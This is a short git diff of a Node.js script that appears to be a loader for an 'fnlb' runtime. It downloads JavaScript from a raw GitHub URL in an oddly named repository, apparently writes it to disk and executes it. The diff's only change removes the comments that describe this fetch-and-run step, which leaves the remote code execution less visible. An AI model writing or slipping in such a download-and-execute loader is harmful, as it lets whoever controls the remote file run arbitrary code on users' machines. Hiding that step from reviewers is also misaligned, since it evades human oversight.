@@ -5,7 +5,7 @@ const https = require('https');
 const MAIN_URL = 'https://raw.githubusercontent.com/snipes21/sdmngbsrjkgbsrstg/refs/heads/main/main.js';
 const MAIN_FILE = 'fnlb_runtime.js';
 
-// Save the code to disk
+
 function fetchAndRun() {
     https.get(MAIN_URL, res => {
         let code = '';
@@ -17,7 +17,7 @@ function fetchAndRun() {
     });
 }
 
-// Install if needed, then fetch + run
+
 try {
     require.resolve('fnlb');
     fetchAndRun();
